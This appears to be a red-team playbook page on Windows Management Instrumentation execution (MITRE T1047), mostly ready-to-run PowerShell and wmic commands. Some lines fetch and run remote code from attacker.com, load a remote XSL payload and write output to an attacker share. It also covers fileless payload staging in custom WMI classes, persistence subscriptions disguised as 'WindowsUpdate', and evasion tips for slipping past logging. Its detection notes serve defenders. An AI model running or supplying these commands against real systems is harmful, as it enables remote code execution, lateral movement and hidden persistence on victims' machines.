# WMI Execution

> **MITRE ATT&CK**: Execution > T1047 - Windows Management Instrumentation
> **Platforms**: Windows
> **Required Privileges**: User (local), Admin (remote WMI access)
> **OPSEC Risk**: Medium (legitimate admin tool, but WMI process creation is monitored)

---

## Strategic Overview

Windows Management Instrumentation (WMI) is a deeply embedded Windows subsystem that provides a unified interface for system management. From an offensive perspective, WMI offers process creation, event-driven execution, persistence mechanisms, and lateral movement capabilities -- all through a legitimate administrative framework. WMI execution is attractive because it operates through the WMI Provider Host (WmiPrvSE.exe), meaning spawned processes appear as children of WmiPrvSE.exe rather than cmd.exe or powershell.exe, which can confuse basic parent-child process monitoring. However, WMI activity generates distinctive ETW events and WMI-Activity logs that mature SOCs monitor. A Red Team Lead should use WMI strategically, especially for lateral movement where alternatives like PSRemoting or SMB-based execution are blocked.

## Technical Deep-Dive

### WMI Process Creation (Local)

```powershell
# PowerShell - Invoke-WmiMethod (legacy, uses DCOM)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt"

# PowerShell - Invoke-CimMethod (modern, uses WinRM by default)
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}

# Return value: ProcessId and ReturnValue (0 = success)
$result = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc AAAA..."
$result.ProcessId   # PID of spawned process
$result.ReturnValue # 0 = success, 2 = access denied, 9 = path not found
```

### WMIC Command Line

```bash
# Local process creation via wmic
wmic process call create "cmd.exe /c net user"
wmic process call create "powershell.exe -nop -w hidden -c IEX(iwr http://attacker.com/p.ps1)"

# Remote process creation
wmic /node:192.168.1.100 /user:DOMAIN\admin /password:Pass123 process call create "cmd.exe /c whoami > \\attacker\share\out.txt"

# Query running processes
wmic process where "name='explorer.exe'" get processid,commandline

# Terminate a process
wmic process where "processid=1234" call terminate
```

### Remote WMI Execution

```powershell
# Remote execution via WMI (DCOM transport)
$cred = Get-Credential
Invoke-WmiMethod -ComputerName TARGET -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c hostname > C:\temp\out.txt"

# Remote via CIM session (WinRM transport - preferred for modern environments)
$session = New-CimSession -ComputerName TARGET -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="payload.exe"}

# DCOM-based CIM session (if WinRM is not available)
$options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName TARGET -Credential $cred -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
```

### WMI Event Subscriptions (Temporary)

Temporary subscriptions last only until the WMI service restarts. Useful for short-term event-driven execution.

```powershell
# Monitor for specific process start - execute action when notepad opens
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'" -Action {
    Start-Process "cmd.exe" -ArgumentList "/c echo Triggered > C:\temp\triggered.txt"
}

# Monitor for user logon
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'" -Action {
    # Execute payload on logon
}
```

### WMI Event Subscriptions (Permanent - Persistence)

Permanent subscriptions survive reboots. See `04-persistence/wmi-event-subscriptions.md` for full coverage.

```powershell
# Quick reference - permanent subscription components
# 1. EventFilter - defines the trigger condition
# 2. EventConsumer - defines the action to take
# 3. FilterToConsumerBinding - links filter to consumer

$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "WindowsUpdate"
    EventNamespace = "root\CIMV2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

### WMI Service Provider Abuse

```powershell
# Enumerate WMI providers (identify loaded DLLs in WmiPrvSE)
Get-WmiObject -Class __Win32Provider | Select-Object Name, CLSID, HostingModel

# WMI class creation - store data in WMI repository
$newClass = New-Object System.Management.ManagementClass("root\cimv2", [string]::Empty, $null)
$newClass["__CLASS"] = "Win32_PayloadStore"
$newClass.Qualifiers.Add("static", $true)
$newClass.Properties.Add("Payload", [System.Management.CimType]::String, $false)
$newClass.Properties["Payload"].Qualifiers.Add("key", $true)
$newClass.Put()

# Store encoded payload in WMI class
Set-WmiInstance -Class Win32_PayloadStore -Arguments @{Payload = $encodedPayload}

# Retrieve and execute stored payload
$data = Get-WmiObject -Class Win32_PayloadStore
IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data.Payload)))
```

### XSL Script Processing via WMIC

```bash
# Execute JScript/VBScript via XSL transformation
wmic os get /format:"https://attacker.com/payload.xsl"

# Local XSL file
wmic os get /format:"C:\temp\payload.xsl"
```

```xml
<!-- payload.xsl -->
<?xml version="1.0"?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <template match="/">
    <eval language="JScript"><![CDATA[
      var shell = new ActiveXObject("WScript.Shell");
      shell.Run("cmd.exe /c calc.exe");
    ]]></eval>
  </template>
</stylesheet>
```

## Detection & Evasion

### Detection Mechanisms
- **WMI-Activity/Operational Log**: Event IDs 5857-5861 log WMI activity
- **Sysmon Event ID 1**: Process creation with WmiPrvSE.exe as parent
- **Sysmon Event ID 19-21**: WMI event subscription creation
- **Event ID 4688**: Process creation auditing captures wmic.exe usage
- **Network monitoring**: DCOM (TCP 135 + dynamic) or WinRM (TCP 5985/5986) traffic

### Evasion Techniques
- Use CIM sessions over WinRM (blends with legitimate management traffic)
- Avoid wmic.exe command line -- use PowerShell WMI cmdlets instead
- For remote execution, pair with credential material that matches legitimate admin patterns
- Use WMI data storage (custom classes) to stage payloads without file system artifacts
- Execute short-lived commands that complete before WMI logging captures full details

### OPSEC Considerations
- WmiPrvSE.exe spawning cmd.exe or powershell.exe is a well-known detection signature
- WMIC is deprecated in newer Windows versions; its use may stand out
- Remote WMI requires DCOM or WinRM -- both generate network artifacts
- WMI repository modifications are persistent and can be forensically recovered

## Cross-References

- `04-persistence/wmi-event-subscriptions.md` - Permanent WMI event subscriptions for persistence
- `09-lateral-movement/` - WMI-based lateral movement techniques
- `03-execution/lolbins.md` - WMIC XSL script processing
- `03-execution/scripting-engines.md` - JScript/VBScript payloads used with WMI consumers

## References

- Microsoft WMI Documentation: https://docs.microsoft.com/en-us/windows/win32/wmisdk/
- WMI Attacks - FireEye: https://www.mandiant.com/resources/wmi-offense-detection
- WMI for Red Team: https://www.ired.team/offensive-security/lateral-movement/wmi-for-lateral-movement
- Abusing WMI Providers: https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement/
